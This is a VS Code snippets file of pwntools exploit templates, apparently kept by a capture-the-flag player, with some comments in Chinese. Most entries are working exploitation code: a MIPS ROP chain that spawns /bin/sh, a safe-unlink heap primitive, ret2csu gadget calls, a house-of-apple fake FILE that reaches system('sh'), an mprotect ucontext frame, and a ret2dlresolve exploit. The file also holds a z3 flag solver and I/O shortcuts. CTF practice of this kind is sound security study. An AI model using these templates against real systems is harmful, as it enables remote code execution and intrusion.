{
	// Place your snippets for python here. Each snippet is defined under a snippet name and has a prefix, body and 
	// description. The prefix is what is used to trigger the snippet and the body will be expanded and inserted. Possible variables are:
	// $1, $2 for tab stops, $0 for the final cursor position, and ${1:label}, ${2:another} for placeholders. Placeholders with the 
	// same ids are connected.
	// Example:
	// "Print to console": {
	// 	"prefix": "log",
	// 	"body": [
	// 		"console.log('$1');",
	// 		"$2"
	// 	],
	// 	"description": "Log output to console"
	// }

	"z3-solver": {
		"prefix": "z3sol",
		"body": [
			"from z3 import *",
			"# 创建一个32个整数的列表",
			"flag = [BitVec('flag[%d]' % i, 32) for i in range(32)]",
			"# 创建一个求解器",
			"s = Solver()",
			"# 添加约束条件",
			"s.add(flag[23] * flag[23] == 0)",
			"[s.add(flag[i] < 0x7f, flag[i] >= 20) for i in range(32)]",
			"# 求解",
			"if s.check() == sat:",
			"\tm = s.model()",
			"\tprint(m)",
			"\tflag_values = [m.evaluate(flag[i]).as_long() for i in range(32)]",
			"\tprint('flag:', ''.join(map(chr,flag_values)))",
			"else:",
			"\tprint('无解')"
		],
		"description": "Log output to console"
	},

	"mips-rop": {
		"prefix": "mipsrop",
		"body": [
			"from pwn import *",
			"context.terminal = ['tmux', 'splitw', '-h']",
			"fname = args.FNAME if args.FNAME else './mips'",
			"exe = ELF(fname)",
			"context.binary = exe",
			"",
			"if args.REMOTE:",
			"\thost, port = args.REMOTE.split(':')",
			"\tio = remote(host, int(port))",
			"else:",
			"\t# io = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234', fname])",
			"\tio = process(['qemu-mipsel-static', '-L', '/etc/qemu-binfmt/mipsel' ,fname])",
			"",
			"s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter",
			"r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil",
			"",
			"def exp():",
			"\t# 0x0040B2A0  |  addiu $a2,$sp,0x44+var_C |  jalr  $s1",
			"\tj_s1 = 0x40B2A0",
			"\t",
			"\t# .text:004414C8 34 00 BF 8F                   lw      $ra, 0x18+var_s1C($sp)",
			"\t# .text:004414CC 25 10 00 02                   move    $v0, $s0",
			"\t# .text:004414D0 30 00 B6 8F                   lw      $s6, 0x18+var_s18($sp)",
			"\t# .text:004414D4 2C 00 B5 8F                   lw      $s5, 0x18+var_s14($sp)",
			"\t# .text:004414D8 28 00 B4 8F                   lw      $s4, 0x18+var_s10($sp)",
			"\t# .text:004414DC 24 00 B3 8F                   lw      $s3, 0x18+var_sC($sp)",
			"\t# .text:004414E0 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)",
			"\t# .text:004414E4 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)",
			"\t# .text:004414E8 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)",
			"\t# .text:004414EC 08 00 E0 03                   jr      $ra",
			"\t# .text:004414F0 38 00 BD 27                   addiu   $sp, 0x38",
			"\tset_s1 = 0x4414c8",
			"\t",
			"\t# 0x0041FBF4  |  move $t9,$a2 |  jr    $a2    ",
			"\tj_a2 = 0x41FBF4",
			"\t",
			"\tpadlen = 0x60 - 0x18",
			"\tra_off = 0x5c - 0x18",
			"\tpayload = flat({",
			"\t\tra_off: set_s1,",
			"\t\tpadlen: {",
			"\t\t\t0x18+0x4: j_a2, # $s1",
			"\t\t\t0x18+0x1c: j_s1, # $ra",
			"\t\t\t0x38+0x38: asm(shellcraft.execve(b'/bin/sh'))",
			"\t\t}",
			"\t})",
			"\tio.send(payload)",
			"\t",
			"if '__main__' == __name__:",
			"\tif args.DEBUG:",
			"\t\tcontext.log_level='debug'",
			"\texp()",
			"\tio.interactive()",
		]
	},
	"safe-unlink": {
		"prefix": "unlink",
		"body": [
			"addr_global_tbl = 0x602120",
			"fake_chunk_ptr = addr_global_tbl",
			"fake_fd = fake_chunk_ptr - 0x18",
			"fake_bk = fake_chunk_ptr - 0x10",
			"payload_unlink = flat({",
			"\t0x8:    0x1f1,",
			"\t0x10:   fake_fd,",
			"\t0x18:   fake_bk,",
			"\t0x1f0:  0x1f0   # nextchunk.prev_size",
			"})",
			"# now the *fake_chunk_ptr = fake_chunk_ptr - 0x18",
			"def write_to(addr, val):",
			"\tpayload_write = flat({",
			"\t\t0x0:    0x1f8,",
			"\t\t0x8:   addr,",
			"\t})",
			"\tedit(8, len(payload_write), payload_write)",
			"\tedit(7, 0x10, p64(val))"
		]
	},
	"call by csu_init": {
		"prefix": "csu_init",
		"body": [
			"def call_by_csu_init(fn_got, arg0, arg1, arg2):",
			"\t# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;",
			"\taddr_pop6 = 0x40070A",
			"\t# mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12+rbx*8]; add rbx, 1; cmp rbx, rbp; jnz ...; ",
			"\t# add rsp, 8; pop * 6; ret",
			"\taddr_call_arg3 = 0x4006F0",
			"\tpayload = flat([",
			"\t\taddr_pop6, 0, 1, fn_got, arg2, arg1, arg0,",
			"\t\taddr_call_arg3, [0]*7   # paddings",
			"\t])",
			"\treturn payload"
		]
	},
	
	"house-of-apple fake FILE": {
		"prefix": "hoa",
		"body": [
			"fake_FILE_addr = heap_base + 0x2b0",
			"_wide_data = fake_FILE_addr + 8",
			"_wide_vtable = _wide_data + 0xe0 - 0x60",
			"# Calling chain: ",
			"# exit()",
			"#  |-- _IO_flush_all_lockp()",
			"#       |-- _IO_OVERFLOW(fp) ==> _IO_wfile_jumps.__overflow()",
			"#           |-- _IO_wdoallocbuf(fp) ==> fp->_wide_data->_wide_table->__doallocate: offset +0x68 from vtable",
			"# Requirements:",
			"#   _flags &= ~(2|8|0x800)",
			"#   mode > 0",
			"#   _wide_data->_IO_write_base = 0",
			"#   _wide_data->_IO_write_ptr > _wide_data->_IO_write_base",
			"#   _wide_data->_IO_buf_base = 0",
			"#   fp->_vtable_offset = 0",
			"fake_FILE = flat([",
			"    b'  sh'.ljust(8, b'\\0'), # _flags &= ~(2|8|0x800), u64(b'  sh')==0x68732020",
			"    0, 0, 0, # _IO_read_ptr, _IO_read_end, _IO_read_base",
			"    0, # _IO_write_base",
			"    1, # RDX = _IO_write_ptr,",
			"    2, # _IO_write_end",
			"    [0] * 6, ",
			"    0, # +0x68, _chain",
			"    [0] * 6, ",
			"    _wide_data, # +0xa0: _wide_data = fake_FILE+8",
			"    [0] * 3, ",
			"    1, # +0xc0: _mode",
			"    [0] * 2, ",
			"    libc.sym._IO_wfile_jumps, # +0xd8: RAX = _vtable",
			"    # fake_FILE end, but fake_IO_wide_data still have some members.",
			"    0,",
			"    _wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable",
			"    libc.sym.system,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__doallocate",
			"])",
			"",
			"edit(0, b'\\0'*0x58 + p64(fake_FILE_addr)) # set _IO_list_all->_chain",
			"edit(1, fake_FILE)",
		]
	},
	"build ucontext_t obj": {
		"prefix": "ucontext",
		"body": [
			"ucontext = flat({",
			"\t0x28: 0,          # +0x28: r8",
			"\t0x30: 0,          # +0x30: r9",
			"\t0x48: 0,          # +0x48: r12",
			"\t0x50: 0,          # +0x50: r13",
			"\t0x58: 0,          # +0x58: r14",
			"\t0x60: 0,          # +0x60: r15",
			"\t0x68: heap_base,  # +0x68: rdi",
			"\t0x70: 0x21000,    # +0x70: rsi",
			"\t0x78: 0,          # +0x78: rbp",
			"\t0x80: 0,          # +0x80: rbx",
			"\t0x88: 7,          # +0x88: rdx",
			"\t0x98: 0,          # +0x98: rcx",
			"\t0xa0: addr_rop,   # +0xa0: rsp",
			"\t0xa8: mprotect    # +0xa8: rip",
			"})",
			"assert(len(ucontext) == 0xb0)"
		]
	},
	"ret2dlresolve x64 template": {
		"prefix": "ret2dl",
		"body": [
			"# ret2dl-resolve_x64:",
			"# Requirements:",
			"#   - sym->st_other |= 0x3;",
			"#   - value = l->l_addr + sym->st_value; // value to be the target function address.",
			"#       - l->l_addr = target_func_addr - resolved_func_addr;",
			"#       - sym->st_value = resolved_func_addr;",
			"#           - sym = got_of_resolved_func - offset(st_value)",
			"#                 = got_of_resolved_func - 8",
			"#       - rel_addr = any_writable_addr; // *rel_addr = value;",
			"#                  = l->addr + reloc->r_offset;",
			"#   ",
			"def forgeLinkMap(addr_linkmap, l_addr, got_of_resolved_func, reloc_arg):",
			"\tlog.debug('Fake linkmap object at %#x, l_addr=%#x, sym@%#x\\n', addr_linkmap, l_addr, got_of_resolved_func)",
			"\taddr_Elf_Dyn_strtab = addr_linkmap # Any readable address is OK.",
			"\taddr_Elf_Dyn_symtab = addr_linkmap + 8",
			"\taddr_Elf_Dyn_jmprel = addr_Elf_Dyn_symtab + 0x10 ",
			"\taddr_Elf_Rela = addr_Elf_Dyn_jmprel + 0x10",
			"\tlog.debug('DT_STRTAB at %#x\\n\\tDT_SYMTAB at %#x\\n\\tDT_JMPREL at %#x\\n\\tElf64_Rela object at %#x\\n'",
			"\t\t, addr_Elf_Dyn_strtab",
			"\t\t, addr_Elf_Dyn_symtab",
			"\t\t, addr_Elf_Dyn_jmprel",
			"\t\t, addr_Elf_Rela",
			"\t)",
			"\tElf_Dyn_symtab = [0, got_of_resolved_func - 8]",
			"",
			"\t# In sysdeps/x86_64/dl-runtime.c:",
			"\t# #define reloc_offset reloc_arg * sizeof (PLTREL)",
			"\t# #define reloc_index  reloc_arg",
			"\t# ",
			"\t# 32-bit: reloc_offset <=> reloc_arg",
			"\t# 64-bit: reloc_offset = reloc_arg * sizeof(Elf64_Rela) = reloc_arg * 24",
			"\t# ",
			"\tElf_Dyn_jmprel = [0, addr_Elf_Rela - 24*reloc_arg]",
			"\t",
			"\tr_offset = addr_Elf_Dyn_symtab - l_addr ",
			"\tElf_Rela_obj = [",
			"\t\tr_offset, # r_offset, Any writable address is OK.",
			"\t\t7, # r_info = (sym_idx << 32) | sym_type",
			"\t\t0, # r_addend",
			"\t]",
			"\tlog.debug('Fake Elf_Rela:\\n\\tr_offset=%x\\n', r_offset)",
			"\taddr_binsh = addr_linkmap + 0x78",
			"\tfake_linkmap = flat({",
			"\t\t0: [l_addr, ",
			"\t\t\tElf_Dyn_symtab, # +0x08",
			"\t\t\tElf_Dyn_jmprel, # +0x18 ",
			"\t\t\tElf_Rela_obj,   # +0x28",
			"\t\t], ",
			"\t\t0x68:[",
			"\t\t\taddr_Elf_Dyn_strtab,    # +0x68: l_info[DT_STRTAB] ==> l_info[5]",
			"\t\t\taddr_Elf_Dyn_symtab,    # +0x70: l_info[DT_SYMTAB] ==> l_info[6]",
			"\t\t\tb'/bin/sh\\0'             # +0x78",
			"\t\t], ",
			"\t\t0xf8: addr_Elf_Dyn_jmprel   # 0xf8: l_info[DT_JMPREL] ==> l_info[23]",
			"\t})    ",
			"\treturn fake_linkmap, addr_binsh",
			"",
			"def exp():",
			"\tprdi = 0x40115E",
			"\tprsi = 0x40116B",
			"\tret = prdi + 1",
			"\tgot_setbuf = exe.got.setbuf",
			"\treloc_arg = 0",
			"\taddr_linkmap = exe.bss()",
			"\tl_addr = libc.sym.system - libc.sym.setbuf",
			"\tfake_linkmap, addr_binsh = forgeLinkMap(addr_linkmap, l_addr, got_setbuf, reloc_arg)",
			"\tdlfixup_trampol = 0x401026",
			"\tpayload = flat({0x78:[",
			"\t\tprdi, 0, prsi, addr_linkmap, exe.plt.read, ",
			"\t\tprdi, addr_binsh, dlfixup_trampol, addr_linkmap, reloc_arg,",
			"\t]})",
			"",
			"\ts(payload)",
			"\t# bpt()",
			"\ts(fake_linkmap)",
		]
	},
	"create io": {
		"prefix": "gio",
		"body": [
			"if args.REMOTE:",
			"\thost, port = args.REMOTE.split(':')",
			"\tio = remote(host, int(port))",
			"else:", 
			"\tio = process(${1:f_name})"
		]
	},
	
	"main entry": {
		"prefix": "main",
		"body": [
			"if '__main__' == __name__:",
			"\tif args.DEBUG:",
			"\t\tcontext.log_level='debug'",
			"\texp()",
			"\tio.iteractive()"
		],
		"description": "import pwn"
	},

	"pwntools header": {
		"prefix": "pwn",
		"body": [
			"from pwn import *",
			"context(os=${1:'linux'}, arch=${2:'i386'}, kernel=${3:'amd64'})",
			"context.terminal = ['tmux', 'splitw', '-h']",
			"fname = args.FNAME if args.FNAME else ${4:'./pwn'}",
			"exe = ELF(fname)",
			"context.binary = exe",
			"",
			"DEFAULT_LIB = {'i386':'/lib/i386-linux-gnu/libc.so.6', 'amd64':'/lib/x86_64-linux-gnu/libc.so.6'}",
			"DEFAULT_LDSO = {'i386':'/lib/i386-linux-gnu/ld-linux.so.2', 'amd64':'/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'}",
			"libname = args.LIB if args.LIB else DEFAULT_LIB[context.arch]",
			"ldname = args.LDSO if args.LDSO else DEFAULT_LDSO[context.arch]",
			"libc = ELF(libname)",
			"ldso = ELF(ldname)",
			"",
			"if args.REMOTE:",
			"\thost, port = args.REMOTE.split(':')",
			"\tio = remote(host, int(port))",
			"elif args.LDSO:",
			"\tio = process([ldname, fname], env={'LD_PRELOAD': libname})",
			"elif args.LIB:",
			"\tio = process(fname, env={'LD_PRELOAD': libname})",
			"else:",
			"\tio = process(fname)",
			"",
			"def bpt():",
			"\tif not args.REMOTE:",
			"\t\tgdb.attach(io)",
			"\tpause()",
			"",
			"def pid_pause():",
			"\tif not args.REMOTE:",
			"\t\tlog.info('PID: %d' % io.proc.pid)",
			"\tpause()",
			"",
			"s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter",
			"r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil",
			"",
			"def opt(idx):",
			"\tsa(b'', str(idx).encode())",
			"",
			"def add(sz, content):",
			"\topt()",
			"\tsa(b'', str(sz).encode())",
			"\tsa(b'', content)",
			"",
			"def edit(idx, content):",
			"\topt()",
			"\tsa(b'', str(idx).encode())",
			"\tsa(b'', content)",
			"",
			"def show(idx):",
			"\topt()",
			"\tsa(b'', str(idx).encode())",
			"",
			"def delete(idx):",
			"\topt()",
			"\tsa(b'', str(idx).encode())",
			"",
			"def exp():",
			"\tpass", 
			"",
			"if '__main__' == __name__:",
			"\tif args.DEBUG:",
			"\t\tcontext.log_level='debug'",
			"\texp()",
			"\tio.interactive()"
		],
		"description": "import pwn"
	},

	"pwn log level": {
		"prefix": "log_level",
		"body": [
			"context.log_level=${1:'debug'}",
		],
		"description": "set pwn context.log_level"
	},

	"pwn info log": {
		"prefix": "pinfo",
		"body": [
			"log.info(f'===========> $1')",
		],
		"description": "pwn log"
	},

	"pwn debug log": {
		"prefix": "pdbg",
		"body": [
			"log.debug(f'===========> $1')",
		],
		"description": "pwn debug log"
	},

	"pwn success log" : {
		"prefix": "psuc",
		"body": [
			"log.success(f'===========> $1')"
		],
		"description": "pwn success log"
	},

	"pwn io abbreviations" : {
		"prefix": "abio",
		"body": [
			"s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter",
			"r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil"
		],
		"description": "pwn success log"
	},

	"pwn io send" : {
		"prefix": "s",
		"body": [
			"send(${1:payload})",
		],
		"description": "pwn io send"
	},

	"pwn io send after" : {
		"prefix": "sa",
		"body": [
			"sendafter(${1:payload})",
		],
		"description": "pwn io send"
	},

	"pwn io send a line" : {
		"prefix": "sl",
		"body": [
			"sendline(${1:payload})",
		],
		"description": "pwn io sendline"
	},

	"pwn io send line after" : {
		"prefix": "sla",
		"body": [
			"sendlineafter(${1:payload})",
		],
		"description": "pwn io sendlineafter"
	},

	"pwn io receive" : {
		"prefix": "r",
		"body": [
			"recv",
		],
		"description": "pwn io recv"
	},

	"pwn io receive until" : {
		"prefix": "ru",
		"body": [
			"recvuntil($1, drop=${2:False})",
		],
		"description": "pwn io recvuntil"
	},

	"pwn io receive a line" : {
		"prefix": "rl",
		"body": [
			"recvline()",
		],
		"description": "pwn io recvline"
	},

	"pwn io receive all" : {
		"prefix": "ra",
		"body": [
			"recvall()",
		],
		"description": "pwn io recvall"
	},

	"pwn exec file name" : {
		"prefix": "fname",
		"body": [
			"fname = args.FNAME if args.FNAME else './syscall_interface'",
		],
		"description": "pwn io recvall"
	},

	"pwn libc file name" : {
		"prefix": "libcname",
		"body": [
			"libcname = args.LIBC if args.LIBC else '/lib/x86_64-linux-gnu/libc.so.6'",
		],
		"description": "pwn io recvall"
	},
}